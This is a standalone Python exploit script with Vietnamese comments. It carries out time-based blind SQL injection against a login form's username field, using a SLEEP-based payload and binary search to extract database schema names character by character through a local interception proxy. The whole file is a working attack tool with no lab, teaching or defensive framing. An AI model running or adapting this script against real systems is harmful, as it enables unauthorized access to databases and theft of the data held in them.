import sys
import requests

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_exploit(url):
    extracted_data = ""
    
    for i in range(1, 65):  # Giới hạn độ dài của dữ liệu cần khai thác (tùy chỉnh theo mục tiêu)
        low, high = 32, 126  # Phạm vi mã ASCII của các ký tự in được (từ 32 đến 125)
        while low <= high:
            mid = (low + high) // 2
            
            sql_payload = "' OR IF(ASCII(SUBSTRING((SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.schemata), %s, 1)) > %s, SLEEP(2), SLEEP(0))-- -" % (i, mid)
            
            post_data = {
                'username': 'ad' + sql_payload,
                'password': 'ad'
            }

            r = requests.post(url, data=post_data, verify=False, proxies=proxies)

            if int(r.elapsed.total_seconds()) > 1.5:  # Nếu thời gian phản hồi > 1.5 giây, ký tự cần tìm lớn hơn mid
                low = mid + 1
            else:
                high = mid - 1
        
        extracted_data += chr(low)  # low sẽ chứa ký tự chính xác sau khi vòng lặp kết thúc
        sys.stdout.write('\r' + extracted_data)
        sys.stdout.flush()

    return extracted_data

def main():
    if len(sys.argv) != 2:
        sys.exit(-1)

    url = sys.argv[1]
    extracted_data = sqli_exploit(url)
    print("\n(+) Extracted Data: %s" % extracted_data)

if __name__ == "__main__":
    main()
